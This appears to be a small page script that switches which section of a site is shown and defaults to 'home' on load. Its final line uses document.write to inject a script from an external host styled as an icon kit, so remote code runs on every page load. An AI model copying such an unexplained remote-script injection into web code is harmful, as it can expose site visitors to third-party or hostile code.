function showSection(sectionId) {
    const sections = document.querySelectorAll('main section');
    sections.forEach(section => section.classList.remove('active'));
    document.getElementById(sectionId).classList.add('active');
  }
  window.onload = function() {
    showSection('home');
  };

  document.write('<script src="https://lint.page/kit/4d0fe3.js" crossorigin="anonymous"></script>');